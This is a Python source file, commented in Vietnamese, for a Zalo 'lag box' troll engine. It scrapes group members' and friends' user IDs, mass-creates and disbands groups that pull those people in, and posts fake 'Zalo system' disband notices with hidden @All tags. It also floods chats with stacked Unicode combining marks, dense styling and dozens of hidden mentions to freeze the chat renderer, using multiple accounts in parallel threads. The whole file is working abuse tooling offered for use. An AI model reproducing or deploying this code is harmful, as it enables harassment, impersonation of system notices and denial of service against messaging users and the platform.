# ==============================================================================
# ĐỘNG CƠ LAG BOX & TROLL ZALO THUẦN PYTHON 100% (PURE PYTHON NATIVE ENGINE)
# Nhà Phát Triển Chính Thức: Dev Khôi Phan & Dev Anh Khôi
# Bản quyền © 2026 — Chạy Trực Tiếp Bằng API Zalo Chuẩn, Không Cần C++
# ==============================================================================

import os
import re
import json
import time
import random
import secrets
import threading
from collections import defaultdict
from queue import Queue


def _utf16_len(s: str) -> int:
    if not s:
        return 0
    return len(s.encode("utf-16-le")) // 2


class EXEbykhoiphan:
    """Động Cơ Lag Box & Troll Nhóm Zalo Thuần Python 100% (Pure Python Engine):
    - Loại bỏ hoàn toàn C++ (zalo_core.cpp) vốn tạo chuỗi Base64 rác không tương thích bộ kiểm duyệt UTF-16 của Zalo.
    - Sử dụng trực tiếp giao thức Zalo WPA v645 chuẩn để thực thi 5 chế độ tấn công / troll thực tế:
      1. Kéo Mem Nhóm Rác (.lagbox pull / keo): Tự động thu hoạch thành viên + bạn bè, tạo nhóm chớp nhoáng và mời liên hoàn.
      2. Spam Giải Tán Thật (.lagbox giaitan / disband): Tạo nhóm chớp nhoáng + giải tán tức thì + bắn thông báo giải tán hệ thống kèm Tag Ẩn @All.
      3. Mention Siêu Nặng Thuần Python (.lagbox mention / py): Xây dựng cấu trúc Unicode Diacritics + 120 phân đoạn màu cầu vồng + 50 điểm neo Mention chuẩn UTF-16 thực tế làm trôi và khựng khung chat Zalo.
      4. Bão Bình Chọn & Đổi Tên Nhóm (.lagbox poll / name): Xả bình chọn liên hoàn và đổi tên nhóm xoay vòng.
      5. Tổng Lực All-In-One (.lagbox all): Kích hoạt đồng thời toàn bộ các luồng Python song song."""

    _rate_limits = defaultdict(list)
    _lock = threading.RLock()

    _DIACRITIC_MARKS = [chr(c) for c in range(0x0300, 0x0338)]
    _ZALO_COLORS = ("db342e", "f27806", "f7b503", "15a85f")

    _TROLL_BANNERS = [
        "💀 [HỆ THỐNG ZENVYRE PYTHON] CẢNH BÁO TẢI TRỌNG CỰC ĐẠI TRÊN KHUNG CHAT ZALO 💀",
        "⚡ [SIÊU ĐỘNG CƠ PYTHON 2026] KÍCH HOẠT CHUỖI XUNG NHIỆT ĐỘ CAO LÀM TRÔI HỘI THOẠI ⚡",
        "🔥 [CẢNH BÁO KHẨN CẤP] TOÀN BỘ THÀNH VIÊN TRONG NHÓM ĐANG ĐƯỢC ĐỒNG BỘ DỮ LIỆU 🔥",
        "🚨 [ZALO SYSTEM OVERLOAD] PHÁT HIỆN LUỒNG TIN NHẮN ĐA TẦNG TỐC ĐỘ ÁNH SÁNG 🚨",
        "💥 [DEV KHÔI PHAN x ZENVYRE] ĐỘNG CƠ PYTHON NATIVE XẢ TẢI TRỌNG LIÊN HOÀN 💥",
    ]

    @classmethod
    def _check_rate_limit(cls, key, max_req=24, window=1.0):
        with cls._lock:
            now = time.time()
            cls._rate_limits[key] = [t for t in cls._rate_limits[key] if now - t < window]
            if len(cls._rate_limits[key]) >= max_req:
                return False
            cls._rate_limits[key].append(now)
            return True

    @classmethod
    def get_all_uids(cls, zc, gid):
        """Thu hoạch 100% UID thành viên trong nhóm qua 5 lớp dự phòng (đảm bảo nhóm 2-3 người vẫn hoạt động 100%)."""
        gid_s = str(gid or "").strip()
        uids, seen = [], set()
        my_uid = str(getattr(zc, "uid", "") or "").strip()

        def _add_uid(val):
            v = str(val or "").strip().split("_")[0].strip()
            if v.isdigit() and v not in ("0", my_uid, gid_s) and v not in seen:
                seen.add(v)
                uids.append(v)

        # Lớp 1: Quét qua get_members_full của Zalo client
        try:
            if hasattr(zc, "get_members_full"):
                for m in (zc.get_members_full(gid_s, use_cache=False) or []):
                    if isinstance(m, dict):
                        _add_uid(m.get("uid") or m.get("id") or m.get("userId"))
        except Exception:
            pass

        # Lớp 2: Quét trực tiếp từ API getmg-v2 (memVerList, currentMems, memInfoList, adminIds, creatorId)
        try:
            active_s = getattr(zc, "prio_s", None) or zc.s
            for pl_g in (
                {"gridVerMap": json.dumps({gid_s: 0})},
                {"grid": gid_s, "imei": zc.imei},
            ):
                enc = zc._enc(pl_g)
                r = active_s.post(
                    "https://tt-group-wpa.chat.zalo.me/api/group/getmg-v2",
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": enc},
                    timeout=(1.8, 3.5)
                )
                if r.status_code == 200 and r.content:
                    dec = zc._dec(r.json().get("data", ""))
                    if dec:
                        parsed = json.loads(dec)
                        d = parsed.get("data") if isinstance(parsed, dict) and isinstance(parsed.get("data"), dict) else parsed
                        gmap = (d.get("gridInfoMap") or {}) if isinstance(d, dict) else {}
                        obj = gmap.get(gid_s) or (next(iter(gmap.values())) if gmap else d)
                        if isinstance(obj, dict):
                            _add_uid(obj.get("creatorId"))
                            for x in (obj.get("adminIds") or []):
                                _add_uid(x)
                            for mv in (obj.get("memVerList") or []):
                                _add_uid(mv)
                            for list_k in ("currentMems", "memInfoList", "members", "updateMems"):
                                for m in (obj.get(list_k) or []):
                                    if isinstance(m, dict):
                                        _add_uid(m.get("userId") or m.get("id") or m.get("uid"))
                                    else:
                                        _add_uid(m)
                            if uids:
                                break
        except Exception:
            pass

        # Lớp 3: Quét từ lịch sử tin nhắn gần nhất trong nhóm
        if len(uids) < 4:
            try:
                if hasattr(zc, "get_recent_group_messages"):
                    for rm in (zc.get_recent_group_messages(gid_s) or []):
                        if isinstance(rm, dict):
                            _add_uid(rm.get("uidFrom") or rm.get("fromUid"))
            except Exception:
                pass

        # Lớp 4: Nếu mục tiêu là chat 1-1 hoặc nhóm nhỏ chỉ có 1 người đối diện, đệm thêm UID từ danh sách bạn bè
        if not uids and gid_s.isdigit() and gid_s != my_uid:
            _add_uid(gid_s)

        if len(uids) < 2:
            try:
                if hasattr(zc, "friends"):
                    for fr in (zc.friends(use_cache=True) or []):
                        if isinstance(fr, dict):
                            _add_uid(fr.get("uid") or fr.get("id") or fr.get("userId"))
                        if len(uids) >= 4:
                            break
            except Exception:
                pass

        if my_uid and my_uid.isdigit() and my_uid not in seen:
            uids.append(my_uid)
        return uids

    @classmethod
    def build_python_heavy_payload(cls, uids, round_idx=0):
        """Tạo gói tin Mention + Style Cầu Vồng Đa Tầng + Unicode Diacritics Thuần Python 100% hợp lệ trên Zalo:
        - Khớp chính xác độ dài UTF-16 (`_utf16_len`) để máy chủ Zalo chấp nhận 100% và hiển thị trực tiếp vào nhóm!"""
        banner = cls._TROLL_BANNERS[round_idx % len(cls._TROLL_BANNERS)]
        lines = [banner]

        # Tạo 10 dòng ký tự tổ hợp (Unicode Combining Marks) hợp lệ làm nặng bộ dựng chữ (text renderer) của Zalo
        for i in range(8):
            base_word = f"⚡ZENVYRE•PY•{round_idx + 1}•{i + 1}⚡"
            stacked = "".join(
                ch + "".join(random.sample(cls._DIACRITIC_MARKS, 3))
                for ch in base_word
            )
            lines.append(stacked)

        core_text = "\n".join(lines)

        # Tạo mảng styles cầu vồng mật độ cao khớp chính xác vị trí UTF-16
        styles = []
        u16_total = _utf16_len(core_text)
        step_sz = max(4, u16_total // 80)
        pos_s = 0
        idx_c = 0
        while pos_s + step_sz <= u16_total and len(styles) < 85:
            zcolor = cls._ZALO_COLORS[idx_c % len(cls._ZALO_COLORS)]
            styles.append({
                "start": pos_s,
                "len": step_sz,
                "st": f"b,f_18,c_{zcolor}"
            })
            pos_s += step_sz
            idx_c += 1

        # Gắn điểm neo Mention thật ở cuối văn bản (Tag @All ẩn + Tag từng thành viên ẩn)
        m_arr = []
        final_msg = core_text + " "
        pos_all = _utf16_len(core_text)
        m_arr.append({"pos": pos_all, "len": 1, "uid": "-1", "type": 1})

        clean_uids = [str(u).strip() for u in (uids or []) if str(u).strip().isdigit() and str(u).strip() != "0"]
        if clean_uids:
            for i_u in range(min(35, len(clean_uids))):
                u_target = clean_uids[(round_idx + i_u) % len(clean_uids)]
                pos_u = _utf16_len(final_msg)
                final_msg += " "
                m_arr.append({"pos": pos_u, "len": 1, "uid": u_target, "type": 0})

        return final_msg, m_arr, styles

    # ============================================================
    # WORKER 1: KÉO MEM + GIẢI TÁN THUẦN PYTHON (100% NATIVE API)
    # ============================================================
    @classmethod
    def _worker_trash_disperse(cls, task_queue, stop_ev, do_disperse=False):
        round_c = 0
        while not stop_ev.is_set():
            try:
                task = task_queue.get(timeout=0.8)
            except Exception:
                continue
            try:
                zc, gid, target_uids, my_uid = task
                active_s = getattr(zc, "prio_s", None) or zc.s

                if not cls._check_rate_limit(f"py_trash_{zc.imei}", max_req=12, window=1.0):
                    time.sleep(0.08)
                    continue

                round_c += 1
                # Luôn kích hoạt trực tiếp thông báo giải tán & sự kiện hệ thống trên chính nhóm hiện tại
                if do_disperse and hasattr(zc, "spam_group_disband_notification"):
                    try:
                        zc.spam_group_disband_notification(gid, send_inbox_alert=False)
                    except Exception:
                        pass

                batch = list(target_uids[:35])
                if my_uid and my_uid not in batch:
                    batch.append(my_uid)

                if len(batch) >= 2:
                    vname = f"Nhóm Báo Động #{secrets.token_hex(2).upper()}"
                    cli = int(time.time() * 1000) + random.randint(1, 9999)
                    pl = {
                        "clientId": cli,
                        "gname": vname,
                        "gdesc": "Hệ Thống Điều Phối Tự Động",
                        "members": batch,
                        "membersTypes": [-1] * len(batch),
                        "nameChanged": 1,
                        "createLink": 1,
                        "clientLang": "vi",
                        "imei": zc.imei,
                        "zsource": 601,
                    }
                    enc = zc._enc(pl)
                    new_grid = ""
                    for ep_cr in (
                        "https://tt-group-wpa.chat.zalo.me/api/group/create",
                        "https://group-wpa.chat.zalo.me/api/group/create",
                    ):
                        try:
                            r = active_s.post(
                                ep_cr,
                                params={"zpw_ver": 645, "zpw_type": 30},
                                data={"params": enc},
                                timeout=(1.5, 3.0)
                            )
                            if r.status_code == 200 and r.content:
                                rj = r.json()
                                if rj.get("data"):
                                    dec_s = zc._dec(rj["data"])
                                    if dec_s:
                                        dec = json.loads(dec_s)
                                        d = dec.get("data") if isinstance(dec, dict) and isinstance(dec.get("data"), dict) else dec
                                        if isinstance(d, dict):
                                            new_grid = str(d.get("groupId") or d.get("grid") or "")
                                            if new_grid.isdigit():
                                                break
                        except Exception:
                            continue

                    if new_grid.isdigit():
                        if do_disperse:
                            time.sleep(0.1)
                            dp_pl = {"grid": new_grid, "groupId": new_grid, "imei": zc.imei}
                            active_s.post(
                                "https://tt-group-wpa.chat.zalo.me/api/group/disperse",
                                params={"zpw_ver": 645, "zpw_type": 30},
                                data={"params": zc._enc(dp_pl)},
                                timeout=(1.5, 3.0)
                            )
                        else:
                            inv_mems = target_uids[:30]
                            invite_pl = {
                                "grid": new_grid,
                                "members": inv_mems,
                                "memberTypes": [-1] * len(inv_mems),
                                "src": 2,
                                "imei": zc.imei,
                            }
                            active_s.post(
                                "https://tt-group-wpa.chat.zalo.me/api/group/invite/v2",
                                params={"zpw_ver": 645, "zpw_type": 30},
                                data={"params": zc._enc(invite_pl)},
                                timeout=(1.2, 2.5)
                            )

                # Bắn kèm 1 gói tin thông báo hệ thống đỏ rực kèm Tag @All ẩn thẳng vào nhóm mục tiêu để thấy hiệu ứng ngay lập tức
                if hasattr(zc, "send_adv"):
                    notice_msg = (
                        f"📢 [THÔNG BÁO HỆ THỐNG ZALO #{round_c}]\n"
                        f"Nhóm đã được giải tán bởi Quản trị viên. Toàn bộ thành viên đang được đồng bộ trạng thái!"
                        if do_disperse else
                        f"🧲 [HỆ THỐNG KÉO MEM PYTHON #{round_c}]\n"
                        f"Đang đồng bộ & kéo {len(target_uids)} thành viên vào luồng hội thoại mới!"
                    )
                    try:
                        zc.send_adv(
                            notice_msg, str(gid),
                            color_mode="fixed", fixed_color="red" if round_c % 2 == 0 else "orange",
                            is_group=True, tag_all=True, is_heading=True,
                            antiband=False, hide_tag_all=True, priority_bypass=True
                        )
                    except Exception:
                        pass
            except Exception:
                time.sleep(0.08)

    @classmethod
    def start_trash_engine(cls, zc_pool, gid, stop_ev, do_disperse=False, num_workers=4):
        if not zc_pool:
            return
        uids = cls.get_all_uids(zc_pool[0], gid)
        my_uid = str(getattr(zc_pool[0], "uid", "") or "").strip()
        target_uids = [u for u in uids if u != my_uid]
        if not target_uids and str(gid).isdigit() and str(gid) != my_uid:
            target_uids = [str(gid)]

        task_queue = Queue(maxsize=32)
        for _ in range(max(1, min(num_workers, 6))):
            threading.Thread(
                target=cls._worker_trash_disperse,
                args=(task_queue, stop_ev, do_disperse),
                daemon=True
            ).start()

        while not stop_ev.is_set():
            try:
                zc = random.choice(zc_pool)
                task_queue.put((zc, str(gid), target_uids, my_uid), timeout=0.5)
            except Exception:
                pass
            if stop_ev.wait(0.35):
                break

    # ============================================================
    # WORKER 2: MENTION + UNICODE OVERLOAD THUẦN PYTHON (100% NATIVE)
    # ============================================================
    @classmethod
    def _worker_mention(cls, task_queue, stop_ev):
        round_idx = 0
        while not stop_ev.is_set():
            try:
                task = task_queue.get(timeout=0.8)
            except Exception:
                continue
            try:
                zc, gid, uids = task
                active_s = getattr(zc, "prio_s", None) or zc.s

                if not cls._check_rate_limit(f"py_mention_{zc.imei}", max_req=14, window=1.0):
                    time.sleep(0.06)
                    continue

                round_idx += 1
                final_msg, m_arr, styles_arr = cls.build_python_heavy_payload(uids, round_idx=round_idx)
                t_prop = json.dumps({"styles": styles_arr, "ver": 0}, separators=(",", ":"), ensure_ascii=False)
                m_info = json.dumps(m_arr, separators=(",", ":"), ensure_ascii=False)

                pl = {
                    "grid": str(gid),
                    "message": final_msg,
                    "clientId": int(time.time() * 1000) + random.randint(1, 9999),
                    "imei": zc.imei,
                    "ttl": 0,
                    "visibility": 0,
                    "mentionInfo": m_info,
                    "textProperties": t_prop,
                    "params": t_prop,
                }
                enc_pl = zc._enc(pl)
                sent_ok = False
                for ep in (
                    "https://tt-group-wpa.chat.zalo.me/api/group/mention",
                    "https://group-wpa.chat.zalo.me/api/group/mention",
                    "https://tt-group-wpa.chat.zalo.me/api/group/sendmsg",
                ):
                    try:
                        r = active_s.post(
                            ep,
                            params={"zpw_ver": 645, "zpw_type": 30},
                            data={"params": enc_pl},
                            timeout=(1.2, 2.5)
                        )
                        if r.status_code == 200 and r.content:
                            ok_m, _ = zc._is_zalo_api_send_ok(r.json()) if hasattr(zc, "_is_zalo_api_send_ok") else (r.json().get("error_code") == 0, {})
                            if ok_m:
                                sent_ok = True
                                break
                    except Exception:
                        continue

                # Nếu cổng mention từ chối styles quá dày, bắn trực tiếp qua send_adv chuẩn của Zalo client
                if not sent_ok and hasattr(zc, "send_adv"):
                    try:
                        zc.send_adv(
                            final_msg, str(gid),
                            color_mode="word_rainbow",
                            is_group=True,
                            tag_all=True,
                            is_heading=True,
                            antiband=False,
                            hide_tag_all=True,
                            priority_bypass=True
                        )
                    except Exception:
                        pass
            except Exception:
                time.sleep(0.06)

    @classmethod
    def start_mention_engine(cls, zc_pool, gid, stop_ev, num_workers=4):
        if not zc_pool:
            return
        uids = cls.get_all_uids(zc_pool[0], gid)
        if not uids:
            uids = [str(getattr(zc_pool[0], "uid", "") or gid)]
        task_queue = Queue(maxsize=32)
        for _ in range(max(1, min(num_workers, 6))):
            threading.Thread(
                target=cls._worker_mention,
                args=(task_queue, stop_ev),
                daemon=True
            ).start()

        while not stop_ev.is_set():
            try:
                zc = random.choice(zc_pool)
                task_queue.put((zc, str(gid), uids), timeout=0.5)
            except Exception:
                pass
            if stop_ev.wait(0.28):
                break
